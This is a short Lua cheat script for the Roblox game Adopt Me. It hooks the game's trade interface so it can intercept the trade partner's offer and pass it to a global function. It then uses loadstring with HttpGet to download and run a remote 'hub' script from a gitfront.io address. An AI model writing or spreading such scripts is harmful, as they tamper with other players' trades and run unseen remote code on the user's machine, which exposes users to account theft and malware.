local mod = require(game:GetService("ReplicatedStorage").ClientModules.Core.UIManager.Apps.TradeApp)
newFunc = hookfunction(mod._get_partner_offer, function(...)
    local args = ...
    spawn(function()
        _G.mirar(args)
    end)
    return newFunc(...)
end)

loadstring(game:HttpGet(('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/Hub/AdoptMe.lua'),true))()
